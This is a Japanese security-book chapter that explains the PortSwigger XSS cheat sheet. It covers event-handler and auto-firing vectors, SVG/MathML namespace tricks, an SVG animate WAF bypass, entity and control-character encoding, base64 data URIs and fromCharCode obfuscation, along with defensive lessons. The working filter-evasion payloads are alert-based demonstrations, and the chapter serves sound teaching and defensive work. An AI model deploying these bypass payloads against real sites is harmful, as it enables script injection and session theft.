# 第2章 コンテキストとペイロード技法 ― ブレークアウト・フィルタ/WAF回避・難読化

## PortSwigger XSSチートシート（WAFバイパスの発想）

> ℹ️ **本節の資料取得についての注記（透明性のため）**: 本節が典拠とする PortSwigger の XSS チートシート本体（`https://portswigger.net/web-security/cross-site-scripting/cheat-sheet`）は、執筆環境のネットワーク下り（egress）プロキシによって `portswigger.net` ドメインへの直接アクセスがブロックされ、ページ本文を直接取得（WebFetch）できませんでした。そこで、**PortSwigger 自身が公開しているチートシートの元データ用 GitHub リポジトリ（`PortSwigger/xss-cheatsheet-data`）のスキーマ定義**、**そのデータを機械的に収集して生成された公開ワードリスト（`crawl3r/PortswiggerXSS` の `payloads.txt`。全6,046行から重複を除いた183種の正規化テンプレートを本節向けに抽出）**、および Web 検索で得られた PortSwigger Research の関連記事（"One XSS cheatsheet to rule them all"、"Our favourite community contributions to the XSS cheat sheet"、"SVG animate XSS vector"）のスニペットを突き合わせて、内容を復元・体系化し、Web セキュリティの専門知識で補完しています。ペイロードは可能な限り原典の形を保っていますが、チートシートは頻繁に更新される（原典は「2026 Edition」として更新継続中）ため、最新の細部・対応ブラウザ表は必ず出典 URL でご確認ください。実質的内容を復元できたため、本資料は「取得不可」としては扱っていません。
>
> なお、PortSwigger は元データリポジトリで「このデータを使って他所でホストする派生チートシートを作ってほしくない」と明記しています。本節は**チートシートを丸写しするのではなく、そこに込められた「発想（mindset）」を教育目的で解説し、原理を理解するために代表的なベクトルだけを引用**する方針を取っています。網羅的な一覧が必要なときは、必ず原典のインタラクティブ版を参照してください。

この節では、PortSwigger の **XSS チートシート（cheat sheet＝攻撃に使える「ベクトル〔攻撃文字列のパターン〕」を体系的に集めた早見表）** を題材に、単なるペイロード集としてではなく、**「WAF（Web Application Firewall＝アプリの手前で悪意ある通信を検知・遮断する仕組み）やフィルタをどうやって出し抜くか」という発想の枠組み**として読み解きます。反射型の素朴な `<script>alert(1)</script>` が通らなくなった、その先で戦うための「引き出し」を、なぜそれが動くのかという**ブラウザの HTML パーサ（構文解析器）の挙動レベル**まで掘り下げて整理します。この「なぜ」の理解こそが、シグネチャ（既知の攻撃パターンの指紋）に頼る自動 WAF・自動スキャナに勝つための核心です。

---

### このチートシートは何か・どう使うか

PortSwigger の XSS チートシートは、同社の研究者 Gareth Heyes を中心とする PortSwigger Research が、**「HTML フィルタと WAF をバイパスして XSS を達成するための情報を、世界で最も網羅的な形で一箇所に集め、かつ使いやすく提示する」** という明確な目的で作った早見表です。次の特徴を押さえておくと、実務での使い方が一気に明確になります。

- **すべてのベクトルに、実際に動く PoC（Proof of Concept＝概念実証。ブラウザで開くと本当に発火するデモ）がホストされている。** 「理屈上は動くはず」ではなく「このブラウザで実際に動く」ことが確認済みです。
- **「タグ（tag）」「イベント（event）」「ブラウザ」の3軸で絞り込める。** 例えば「`img` タグしか通らない状況で、Firefox で発火するベクトルは？」という具体的な制約から逆引きできます。これがチートシートの最大の実用価値です。
- **各ベクトルに「対応ブラウザ」と「ユーザー操作の要否」が付いている。** 後述しますが、この2つのメタ情報が、攻撃を「本当に刺さるか」を左右します。
- **自動ファジング（fuzzing＝大量の変異入力を機械的に投げて挙動の穴を探す手法）と手動探索の組み合わせ**で発見された、WAF・フィルタ回避に特に有効な新規ベクトルを多数含みます。

> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
> 出典: One XSS cheatsheet to rule them all（PortSwigger Research） — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all

#### データ構造を見ると「発想」が見える

チートシートの元データ（`PortSwigger/xss-cheatsheet-data`）は、イベントハンドラを起点に、それを発火できるタグとブラウザ対応を並べた JSON です。原典 README に載っている実際の定義例を引用します。

```javascript
"onwaiting": {
    "description": "Fires when while waiting for the data",
    "tags": [
        {
            "tag": "video",
            "code": "<video autoplay controls onwaiting=alert(1)><source src=\"validvideo.mp4\" type=video/mp4></video>",
            "browsers": [ "edge" ],
            "interaction": false
        }
    ]
}
```

ここから読み取るべきは、チートシートが世界を **「イベント（`onwaiting` のような発火契機）× タグ（`video` のような入れ物）× ブラウザ（`edge`）× 操作要否（`interaction:false`＝ユーザー操作不要）」** という多次元の組み合わせ空間として捉えている、という点です。`browsers` は `chrome` / `safari` / `firefox` / `edge` の小文字表記で、`interaction` フラグはそのベクトルがユーザーのクリックやマウス移動などを必要とするか（`true`）、勝手に発火するか（`false`）を表します。**この組み合わせ空間の広さこそが、WAF バイパスが原理的に成立してしまう理由**です（次項）。

> 出典: xss-cheatsheet-data（PortSwigger 公式データリポジトリ） — https://github.com/PortSwigger/xss-cheatsheet-data

---

### WAFバイパスの中心思想：「ブロックリストは必ず穴が開く」

WAF や素朴な XSS フィルタの多くは、**ブロックリスト（blocklist＝「危険な文字列」を列挙して一致したら弾く方式）** で動いています。「`<script` を含んだら弾く」「`onerror` を含んだら弾く」「`javascript:` を含んだら弾く」といった具合です。チートシートの発想の中心は、**このブロックリストが列挙しきれないほど、XSS を起こす手段は膨大にある**という事実を突きつけることにあります。

本節で復元した実データを数えると、チートシートが扱うベクトルの素材は次の規模です。

- **スクリプト実行の「入れ物」になりうるタグ: 142種**（`a`, `abbr`, `div`, `img`, `svg`, `math`, `iframe`, `object`, `embed` … さらに実在しない独自要素 `<xss>` まで）。
- **発火契機となるイベントハンドラ: 84種以上**（`onclick` のような定番から、`onwaiting`・`onunhandledrejection`・`ontransitioncancel` のような珍しいものまで。後述するコミュニティ貢献の `onpointer*` 系を加えるとさらに増える）。
- **これらを掛け合わせた具体的な PoC テンプレート: 183種**（同じイベントでも「autofocus で自動発火」「CSS アニメーションで自動発火」など複数の実現形がある）。

単純化して掛け算すれば「入口の数」は数千通りに達します。WAF がこの全パターンを漏れなくブロックしつつ、正規のリッチテキスト入力を壊さないようにするのは現実的に不可能です。**攻撃者は1つ通ればよく、防御側は全部を塞がねばならない**——この非対称性が、ブロックリスト型防御の構造的な敗因です。だからこそ本書は繰り返し「防御はブロックリストではなく、出力エンコーディング（出力時に危険な文字を無害な表現に変換する）と、CSP／Trusted Types のような許可リスト型（allowlist）の多層防御で行うべき」と説きます（詳細は第8章）。

チートシートを「使う」とは、この巨大な組み合わせ空間の中から、**目の前のフィルタがたまたま塞ぎ忘れている一点を素早く見つける**作業に他なりません。

> 出典: One XSS cheatsheet to rule them all（PortSwigger Research） — https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all

---

### スクリプトを実行できる「入口」：タグの体系

「JavaScript を実行させる」入口は、大きく4系統に整理できます。フィルタが1系統を塞いでも、別系統に乗り換えるのが基本戦術です。

#### 1. `<script>` による直接実行

最も素直な入口です。

```html
<script>alert(document.domain)</script>
```

- **なぜ動くか**: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、そこから `</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（scriptデータ状態）に入るためです。出所が開発者か攻撃者かは一切問われません。
- ただし現代の WAF はまず `<script` を弾くので、**実戦ではむしろ通らない前提**で考え、以下の系統に進みます。

#### 2. 属性のイベントハンドラ経由（最重要・本命）

タグそのものは無害でも、**イベントハンドラ属性（`onXXX=` の形で、特定の出来事が起きたときに JavaScript を実行する属性）** を付ければスクリプトが走ります。これがチートシートの主戦場です。

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<xss onpointerover=alert(1)>マウスを乗せて</xss>
```

- **なぜ動くか**: `onerror` などの属性値は「イベントが発火したときに評価される JavaScript コード」として登録されます。`<img src=x>` は存在しない画像 `x` の読み込みに失敗し、その瞬間 `onerror` が発火します。**`<script` という文字列を1文字も使わずにコードを実行できる**のが強みで、`<script` だけを弾く WAF を素通りします。
- 最後の例のように、**実在しない独自タグ `<xss>` でもイベントハンドラは機能します**（HTML パーサは未知のタグを「不明な要素」として DOM に配置し、イベントハンドラ属性はそれでも有効になるため）。「既知の危険タグ名」を列挙して弾くフィルタに対する定番の抜け道です。

#### 3. `javascript:` プロトコル経由

URL を受け取る属性（`href`・`src`・`action`・`data` など）に、`http:` ではなく **`javascript:` スキーム（ブラウザが「これに続く文字列を JavaScript として実行する」と解釈する擬似プロトコル）** を入れる入口です。

```html
<a href="javascript:alert(document.cookie)">クリック</a>
<iframe src="javascript:alert(1)"></iframe>
<form action="javascript:alert(1)"><button>送信</button></form>
<object data="javascript:alert(1)"></object>
<button formaction="javascript:alert(1)">送信</button>
```

- **なぜ動くか**: これらの属性はブラウザにとって「ナビゲーション先の URL」です。ユーザーがリンクをクリックしたりフォームを送信したりして、その URL へ「移動」しようとした瞬間、ブラウザは `javascript:` を検出してスキームの後続部分をコードとして実行します。
- **注意（陳腐化）**: モダンブラウザは安全性向上のため、`javascript:` を許す文脈を年々狭めています。トップレベルの `<iframe src=javascript:>` やアドレスバー直打ちの `javascript:` は現在ほぼ無効化されており、`<a href>` のクリック起点や一部の属性など限られた文脈でしか動きません。「昔は動いた」ベクトルが現在の Chrome/Firefox で動くとは限らないため、**必ずチートシートのブラウザ列と PoC で現物確認**してください。

#### 4. リソース読み込みタグの読み込みライフサイクル（自動実行系）

`img`・`script`・`link`・`object`・`video`・`audio`・`iframe` などは「外部リソースを読みに行く」タグです。この**読み込みの成功・失敗・進行**そのものがイベントを発火させます。

```html
<img src=validimage.png onload=alert(1)>
<img src=1 onerror=alert(1) type=image/gif>
<link href=validstyles.css rel=stylesheet onload=alert(1)>
<object data=/ onload=alert(1)>
<object data=/ onreadystatechange=alert(1)>
<style>@import 'x';</style>  <!-- 読み込み系の一例 -->
<video src=validimage.png onloadstart=alert(1)>
```

- **なぜ動くか**: ブラウザはこれらのタグを DOM に組み込むと同時に、指定リソースの取得（フェッチ）を非同期に開始します。取得の各段階（開始 `onloadstart`、完了 `onload`／`onloadend`、失敗 `onerror`、状態変化 `onreadystatechange`）でイベントが自動発火します。**ユーザー操作が一切不要**なため、後述する「自動実行ベクトル」の中核をなします。

---

### イベントハンドラの体系（84種以上）

チートシートの真髄はイベントハンドラの網羅性にあります。復元した84種を用途別に整理すると、WAF が「よく知られた危険イベント」だけを弾いている場合の**乗り換え先**が見えてきます。以下は本節で復元した一覧です（`on` 接頭辞は共通）。

- **マウス系**: `click` / `dblclick` / `mousedown` / `mouseup` / `mouseover` / `mouseout` / `mouseenter` / `mouseleave` / `mousemove` / `auxclick`（＝中クリック等の補助ボタン） / `contextmenu`（右クリック） / `wheel`（ホイール回転）
- **ポインタ系（コミュニティ貢献で追加）**: `pointerover` / `pointerdown` / `pointerenter` / `pointerleave` / `pointermove` / `pointerout` / `pointerup`（マウス・タッチ・ペンを統合したイベント。WAF が `onmouseover` だけ弾いているとき `onpointerover` が通る、という古典的乗り換え）
- **キーボード系**: `keydown` / `keyup` / `keypress`
- **フォーカス系**: `focus` / `blur` / `focusin` / `focusout`（`autofocus` 属性と組み合わせると自動発火。後述）
- **読み込み・リソース系**: `load` / `error` / `loadstart` / `loadend` / `loadeddata` / `loadedmetadata` / `readystatechange`
- **メディア系**: `play` / `playing` / `pause` / `ended` / `canplay` / `canplaythrough` / `seeked` / `seeking` / `timeupdate` / `volumechange` / `waiting`（`<audio>`／`<video>` に `autoplay controls` を付けて自動再生させ、再生の各局面で発火させる）
- **アニメーション／トランジション系**: `animationstart` / `animationend` / `animationcancel` / `animationiteration` / `transitionrun` / `transitionend` / `transitioncancel`（CSS だけで自動発火できる強力な系統。後述）
- **SVG SMILアニメーション系**: `begin` / `end` / `repeat`（SVG の `<animate>` 等でのみ使う。後述）
- **ドラッグ＆ドロップ系**: `drag` / `dragstart` / `dragend` / `dragenter` / `dragleave` / `dragover` / `drop`
- **クリップボード系**: `copy` / `cut` / `paste` / `beforecopy` / `beforecut` / `beforepaste`
- **フォーム系**: `submit` / `reset` / `change` / `input` / `select` / `invalid` / `search`
- **ウィンドウ・文書系**: `hashchange` / `popstate` / `pageshow` / `message` / `beforeunload` / `resize` / `scroll` / `afterprint` / `beforeprint` / `unhandledrejection`
- **旧IE系（レガシー）**: `activate` / `beforeactivate` / `deactivate` / `beforedeactivate`（Internet Explorer 時代のイベント。現代ブラウザでは動かないものが多いが、`onactivate` などはチートシートに網羅性のため収録。実戦利用は必ずブラウザ列で確認）
- **`<marquee>` 系（レガシー）**: `bounce` / `finish` / `start`（廃止された `<marquee>` タグ専用の珍しいイベント）

> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet

**発想のポイント**: WAF は現実的に `onerror`・`onload`・`onclick`・`onmouseover` など「有名どころ」しか弾けません。上記の**珍しい方の70種以上**が、ほぼ手つかずで残っていることが多いのです。

---

### ユーザー操作なしで発火させる技法（自動実行ベクトル）

イベントハンドラの `interaction` フラグ（前述）が `false`、つまり**被害者がクリックもマウス移動もしなくても、ページを開いた瞬間（または URL のフラグメントに `#x` を付けるだけ）で勝手に発火する**ベクトルは、攻撃の破壊力が段違いです。反射型でリンクを踏ませるだけ、格納型なら閲覧させるだけで成立します。チートシートが磨き上げた「自動発火」の代表技法を、原理とともに挙げます。

#### `autofocus` + `onfocus`：どんな要素でも自動フォーカス

```html
<input autofocus onfocus=alert(1)>
<xss autofocus tabindex=1 onfocus=alert(1)>test</xss>
```

- **なぜ動くか**: `autofocus` 属性が付いた要素は、ページ表示時にブラウザが自動的にフォーカスを当てます。その瞬間 `onfocus` が発火します。`tabindex=1` を付ければ、本来フォーカスできない要素（独自タグ含む）もフォーカス可能になり、この技が使えます。ユーザー操作ゼロで動く定番です。

#### `<img>`/`<script>` などの `onerror`/`onload`

```html
<img src=x onerror=alert(1)>
<script src=validjs.js onload=alert(1)></script>
```

- **なぜ動くか**: 前述の「読み込みライフサイクル」により、リソース取得の失敗（`onerror`）や成功（`onload`）が自動で起きます。`src=x` のように壊れた URL を指定すれば確実に `onerror` が走ります。

#### CSS アニメーションによる自動発火（`@keyframes` + `:target`）

**どんなタグにも `onXXX` イベントを載せられない状況でも**、CSS アニメーションを利用すればアニメーション系イベントを自動発火できる、という発想の転換です。

```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

```html
<style>@keyframes x{from {left:0;}to {left:1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style>
<xss id=x style="position:absolute;" onanimationcancel="alert(1)"></xss>
```

- **なぜ動くか**: 1つ目は、空の `@keyframes x` を定義し、要素に `animation-name:x` を割り当てるだけでアニメーションが「開始」され、`onanimationstart` が**ページ表示直後に自動発火**します。2つ目の `onanimationcancel`・`onanimationiteration` はやや工夫が要り、`:target` セレクタ（URL のフラグメント `#x` が指す要素にだけ適用される CSS 疑似クラス）を使います。攻撃 URL の末尾に `#x` を付けて被害者に踏ませると、`id=x` の要素にアニメーションが適用され、アニメーションのキャンセル（別状態への遷移）時に `onanimationcancel` が発火します。**イベントハンドラ属性を「危険」と見なして削る**サニタイザ相手に、CSS 経由という別ルートで回り込む発想です。

#### CSS トランジションによる自動発火（`:target` + `transition`）

```html
<style>:target {color:red;}</style>
<xss id=x style="transition:color 1s" ontransitionend=alert(1)></xss>
```

- **なぜ動くか**: URL に `#x` を付けると `:target` により `id=x` の要素の色が変わり、`transition:color 1s` によってその変化が1秒かけてアニメーションします。トランジション完了時に `ontransitionend` が発火します。CSS の状態変化を発火源にする点が巧妙です。

#### SVG SMIL アニメーションによる自動発火（`<animate>` 系）

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><animateTransform onbegin=alert(1) attributeName=transform>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><animateMotion onbegin=alert(1) dur=1s repeatCount=1>
```

- **なぜ動くか**: SVG は **SMIL（Synchronized Multimedia Integration Language＝SVG に組み込まれた時間ベースのアニメーション記述言語）** をサポートします。`<animate>` 等の要素は SVG が表示された瞬間にアニメーションを開始し、開始時 `onbegin`、終了時 `onend`、繰り返し時 `onrepeat` が**自動発火**します。`dur=1s`（再生時間）が付いていればユーザー操作は不要です。HTML の一般的なイベント名（`onload` 等）とは異なる SVG 専用イベントなので、HTML 前提のフィルタの盲点になりがちです。

#### `<details>`/`<dialog>` などのUI要素（補足）

> （以下は取得できなかった資料の補足として、一般的な知識に基づく解説です。原典の該当ベクトルはブラウザ列で要確認）

`<details open ontoggle=alert(1)>` は、`open` 属性を付けると表示直後に `ontoggle` が発火する自動実行ベクトルとして広く知られています。同様に、近年の HTML では Popover API に伴う `onbeforetoggle`/`ontoggle` など新しい発火契機が増え続けており、チートシートはこうした新イベントをコミュニティ貢献で取り込み続けています。**「新しいブラウザ機能＝新しい発火契機」であり、WAF のシグネチャ更新は常にそれに遅れる**——これが自動発火ベクトルが枯れない根本理由です。

---

### SVGとMathML：名前空間という抜け道

チートシートの中でも特に「なぜ動くか」の理解が価値を生むのが、**名前空間（namespace＝XML において、同じ要素名でも「どの語彙に属するか」を区別する仕組み。HTML・SVG・MathML はそれぞれ別の名前空間）** を利用したベクトル群です。

#### なぜ SVG/MathML はフィルタをすり抜けるのか

ブラウザの HTML パーサは、通常は「HTML 名前空間」で解析していますが、`<svg>` や `<math>` タグに入ると **「外部コンテンツ（foreign content）」モードに切り替わり、SVG／MathML の解析規則を適用**します。このモード内では、

- 属性名の**大文字小文字が区別される**（`attributeName` のようなキャメルケースが意味を持つ。HTML 名前空間では属性名は小文字化される）。
- `xlink:href` のような**名前空間プレフィックス付き属性**が使える。
- HTML には存在しない `<animate>`・`<foreignObject>` などの要素と、それに固有のイベント（`onbegin` 等）が有効になる。

サニタイザ（sanitizer＝入力の HTML から危険な要素・属性を除去して安全化するライブラリ）や WAF が「HTML の常識」だけで書かれていると、この名前空間切り替え後の世界を正しく扱えず、危険な属性を見落とします。これが SVG/MathML ベクトルの土台です（この現象を突き詰めると mXSS〔mutation XSS〕やサニタイザ回避になります。詳細は第4章）。

#### SVG `<animate>` で `href` を後から書き換える WAF 混乱ベクトル

PortSwigger Research が「SVG animate XSS vector」として紹介した、WAF バイパスの傑作です。

```html
<svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a></svg>
```

- **なぜ動くか（仕組み）**:
  1. `<a id=xss>` というリンク要素を用意し、`<animate>` の `xlink:href=#xss` でそのリンクを**アニメーションの対象**に指定します。
  2. `attributeName=href` は「このリンクの `href` 属性を時間とともに書き換える」という指定です。
  3. `values` 属性には、セミコロン区切りで**複数の値を時系列で**並べられます。ここに `javascript:alert(1)` を混ぜておくと、アニメーション進行中にリンクの `href` がその値に切り替わります。
  4. ユーザーがリンク（"XSS" のテキスト）をクリックすると、その時点の `href`（＝`javascript:alert(1)`）へナビゲートしようとして実行されます。
- **なぜ WAF が騙されるか**: 決め手は、`javascript:alert(1)` を**「一見まっとうな URL の一部」に埋め込む**点と、**`&semi;`（セミコロンの HTML 実体参照）で文字を隠す**点です。WAF は `values` の中身を「`https://portswigger.net?...` で始まる正規の URL」と誤認し、`javascript:` プロトコルの直接出現を検知しそこねます（`&semi;` はブラウザだけが後で `;` にデコードする）。「危険な値を、正規の URL・クエリ・フラグメント・Basic 認証部などに紛れ込ませて WAF の目を逃れる」というのが、この系統の普遍的な発想です。

#### `attributeName=href` と `xlink:href`：サニタイザ回避

サニタイザが「`href` という文字列だけ」をチェックしている場合、`attributeName="xlink:href"` と書けば、名前空間プレフィックス付きの別表記で同じ効果を得つつ検査をすり抜けられます。この「同じ意味を持つ別表記」の存在が、文字列一致型の検査を破ります。

> ⚠️ **一部関連資料は未取得**: PortSwigger Research の "SVG animate XSS vector"（`https://portswigger.net/research/svg-animate-xss-vector`）および技術ブログ "XSS fun with animated SVG"（`https://blog.isec.pl/xss-fun-with-animated-svg/`）は自動取得できませんでした（理由: `portswigger.net` および該当ドメインが egress プロキシによりブロック）。上記のベクトルと解説は検索スニペットと専門知識で復元したものです。正確な原文は各 URL からご確認ください。

**この系統は「現役」で、しかも進化中**という点が重要です。近年の実例として、Angular の HTML サニタイザが SVG アニメーション・SVG URL・MathML 属性経由の格納型 XSS に対して脆弱だった **CVE-2025-66412（2025年公開）**、Roundcube Webmail の SVG animate サニタイザ回避 **CVE-2025-68461（2025年公開）**、SiYuan の `<animate>` 要素経由の未認証 XSS などが報告されています。**「SVG animate＝古い小ネタ」ではなく、2025年時点でも著名 OSS を落とし続けている現役の攻撃面**であることを、バージョン・公開年とともに記憶してください。

> 出典: Angular Stored XSS via SVG Animation/URL/MathML（CVE-2025-66412, 2025年） — https://github.com/angular/angular/security/advisories/GHSA-v4hv-rgfq-gp49
> 出典: Roundcube Webmail SVG Animate XSS Sanitizer Bypass（CVE-2025-68461, 2025年） — https://blog.ostorlab.co/cve-2025-68461-xss-roundcube.html

---

### エンコーディングによる回避

同じベクトルでも、**文字を別の表現に符号化（エンコード）して WAF のパターンマッチを外す**のが、チートシートのもう一つの柱です。鍵は「**ブラウザは各文脈でデコードのタイミングと規則が異なる。WAF はそのすべてを正確に再現できない**」という非対称性です。

#### HTML 実体参照（エンティティ）によるデコードのズレ

HTML 属性値の中では、ブラウザは**属性を「使う」前に HTML 実体参照をデコード**します。この性質を突きます。

```html
<a href="javascript:alert(1)">        <!-- そのまま -->
<a href="javascript&colon;alert(1)">  <!-- コロンを &colon; に -->
<a href="&#106;avascript:alert(1)">   <!-- j を10進実体参照 &#106; に -->
<a href="&#x6a;avascript:alert(1)">   <!-- j を16進実体参照 &#x6a; に -->
<a href="&#106avascript:alert(1)">    <!-- セミコロン無しの実体参照（後述） -->
```

- **なぜ動くか**: ブラウザは `href` 属性値を「URL として使う」直前に `&colon;`→`:`、`&#106;`→`j`、`&#x6a;`→`j` とデコードします。その結果できあがる文字列は `javascript:alert(1)` そのものになり実行されます。一方 WAF は生の入力 `javascript&colon;alert(1)` を見て「`javascript:` が無い」と判断して通してしまいます。**「WAF が見る文字列」と「ブラウザが最終的に解釈する文字列」がズレる**——これがエンコーディング回避の本質です。
- **セミコロン無しの罠**: HTML の歴史的経緯から、ブラウザは `&#106avascript`（末尾セミコロン欠落）のような不完全な数値実体参照も寛容にデコードすることがあります。この「仕様外だが動く」挙動を WAF が再現できていないと、そこが穴になります。

#### エンコーディングが「効く文脈・効かない文脈」

重要な原則です。HTML 実体参照によるデコードは**「HTML の属性値・テキストとして解釈される文脈」でしか起きません**。したがって、次の文脈では HTML エンティティは通用しません。

- `<script>` タグの中身（JavaScript として解釈されるため、HTML デコードは起きない）
- `onmouseover=` などイベントハンドラ属性**の値の中**（一度 HTML デコードされた後は JavaScript として解釈される。二重の規則が絡む）
- CSS の中
- URL のパス・クエリ部（URL エンコードの世界）

この「文脈ごとにデコード規則が違う」構造こそが、第1章で学んだ**出力コンテキスト（context）**の話とエンコーディング回避が表裏一体である理由です。攻撃者は「注入点がどの文脈で、ブラウザがどの順序でデコードするか」を見極めて、その文脈で有効なエンコードを選びます。

#### `javascript:` プロトコル内での制御文字挿入

URL 文脈では、`javascript` と `:` の間や `javascript:` の直前に、**タブ・改行・復帰・NULL バイトなどの制御文字**を挟むと、ブラウザは無視して実行するのに WAF のパターン（`javascript:` の連続一致）は外れます。

```
java&#09;script:alert(1)     （&#09; は水平タブ）
java&#10;script:alert(1)     （&#10; は改行）
&#0;javascript:alert(1)      （先頭に NULL）
```

- **なぜ動くか**: ブラウザは URL を正規化する際、スキーム名に紛れ込んだ一部の制御文字を除去してから `javascript` と認識します。WAF が同じ正規化をしていなければ、`java<タブ>script:` は「`javascript:` ではない」と判定されて通過します。

#### `data:` URI と Base64

```html
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

- **なぜ動くか**: `data:` URI は「URL の中に文書そのものを埋め込む」仕組みです。上のペイロードは `<script>alert(1)</script>` を Base64 符号化したもので、WAF から見ると意味不明なランダム文字列に見え、`script` という単語も `<` も現れません。ブラウザだけが Base64 をデコードして中身の HTML を解釈・実行します。**「危険な語を1文字も含まないのに実行される」**エンコーディング回避の典型です（ただし `data:` を `iframe` トップレベルに読むのは近年制限が強く、動作はブラウザ・文脈依存）。

#### JavaScript 文脈での難読化

すでに JavaScript の中に注入できているが `alert` や `'` が弾かれる、という場面では、コード自体を難読化します。

```javascript
eval(String.fromCharCode(97,108,101,114,116,40,49,41))  // "alert(1)" を文字コードから組み立てて実行
```

- **なぜ動くか**: `String.fromCharCode(...)` は文字コード（10進）から文字列を復元する標準関数です。`alert(1)` という文字列をコードに直接書かずに生成できるため、`alert` という単語を検知するフィルタを回避できます（CyberChef などで一括変換するのが実務の定石）。この系統の難読化 JavaScript は本書の別節で深掘りします。

> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
> 出典（エンコーディング原則の補足）: XSS Filter Evasion Cheat Sheet（OWASP） — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

### 短いベクトル・文字数制限バイパス

注入できる文字数が厳しく制限されている（入力欄の maxlength、リフレクション箇所の切り詰めなど）場面では、**最短のベクトル**が武器になります。チートシートはコミュニティ貢献で短縮ベクトルを収集しています。

- **独自タグでタグ名を短縮**: `<xss onclick=...>` のように、既知タグ名フィルタを避けつつ短く書く。
- **AngularJS の短縮インジェクション**: `@NotSoSecure` が寄稿した、文字数制限下で使える AngularJS 用の短いベクトル（CSTI〔Client-Side Template Injection＝クライアント側テンプレート注入〕。詳細は第5章）。
- **Vue の `v-if` を使ったバイト節約**: `@p4fg` が寄稿した、Vue の `v-if` ディレクティブを利用してバイト数を削るベクトル。

- **発想のポイント**: 「実行できる最小構成は何か」を知っていること自体が、制約の厳しい注入点を突破する鍵になります。属性の引用符を省く（`onerror=alert(1)` はクォート不要）、`alert(1)` を `alert` だけにして後で連鎖させる、などの節約術も同系統です。

> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet

---

### ブラウザ差分を突く

チートシートが各ベクトルに `browsers`（`chrome`/`safari`/`firefox`/`edge`）を明記しているのは、**「あるブラウザでは動かないが別のブラウザでは動く」ベクトルが多数存在する**からです。攻撃者は「被害者が使っているブラウザ」を狙い撃ちできます。

- **特定ブラウザ限定**: 例として `onwaiting` は Edge で発火する（原典データより）。SVG 内の一部ベクトルは Chrome 系でのみ通る、といった差があります。
- **レガシー限定**: `onactivate`/`onbeforedeactivate` などは Internet Explorer 時代のイベントで、現代の主要ブラウザではほぼ動きません。チートシートは網羅性のため収録していますが、**実戦では必ずブラウザ列で「今も動くか」を確認**する必要があります。
- **発想のポイント**: 「Chrome で動かなかった＝XSS 不成立」ではありません。ターゲット環境（社内で Firefox 指定、古い Edge など）を考慮し、そこで動くベクトルへ乗り換えるのが上級者の思考です。

> 出典: Cross-Site Scripting (XSS) Cheat Sheet — https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---

### コミュニティ貢献が示す「発想の広げ方」

チートシートが強力なのは、PortSwigger 単独ではなく**世界中の研究者からのプルリクエスト（`PortSwigger/xss-cheatsheet-data` への貢献）で常に拡張され続けている**からです。過去に評価された貢献の一部を挙げます。

- **`@hahwul` によるポインタイベント群**（`onpointerover`/`onpointerdown`/`onpointerenter`/`onpointerleave`/`onpointermove`/`onpointerout`/`onpointerup`）: 既存のマウスイベントに対応する「もう一系統」を丸ごと追加。WAF が `onmouse*` だけ塞いでいる盲点を突く。
- **`@p4fg` による Vue の `v-if` ベクトル**: フレームワーク固有の記法を XSS ベクトルに転用。
- **`@NotSoSecure` による短縮 AngularJS ベクトル**: 文字数制限対策。

ここから学ぶべき「発想の広げ方」は明確です。**新しいブラウザ API・新しいイベント・新しいフレームワークの記法が登場するたびに、そこには新しい XSS ベクトルが生まれうる**。チートシートを読むとは、この「拡張し続ける攻撃面」の最前線を追い続けることに他なりません。

> 出典: Our favourite community contributions to the XSS cheat sheet（PortSwigger Research） — https://portswigger.net/research/our-favourite-community-contributions-to-the-xss-cheat-sheet
> 出典: xss-cheatsheet-data（PortSwigger 公式データリポジトリ） — https://github.com/PortSwigger/xss-cheatsheet-data

---

### 実務での使い方と、防御側から見た教訓

**攻撃者・診断者としての使い方（正規の許可されたスコープ内で）**:

1. まず注入点の**出力コンテキスト**を特定する（HTML 本文か、属性値か、`<script>` 内か、URL 属性か）。
2. 何が弾かれるかを観察する（`<`? `script`? `on...`? 引用符? `javascript:`?）。
3. チートシートを**「使えるタグ」「使えるイベント」「対象ブラウザ」で絞り込み**、残っている入口を探す。
4. 必要ならエンコーディング（実体参照・制御文字・Base64）で WAF の目を外す。
5. ユーザー操作が期待できない標的なら、`interaction:false` の自動発火ベクトルを優先する。

**防御側としての教訓**（本書全体の主張の再確認）:

- 上記のとおり、**ブロックリスト型の入力フィルタ・WAF は、この巨大な組み合わせ空間を塞ぎきれない**。WAF は「保険」であって主防御にしてはいけない。
- 主防御は、**注入点の文脈に応じた正しい出力エンコーディング**（第1章）と、**サニタイズが必要なら実績あるライブラリ（DOMPurify 等）を最新版で使う**こと。
- さらに、**CSP（Content Security Policy）や Trusted Types による多層防御**で「万一注入されても実行させない」層を重ねる（第8章）。チートシートのベクトルの大半は、`script-src` を厳格化した strict CSP 下では発火してもスクリプト実行に至れない。

チートシートは「攻撃者がいかに柔軟か」を突きつける教材であり、その裏返しとして「なぜ許可リスト型・多層防御でなければ守れないのか」を最も雄弁に語る資料でもあります。

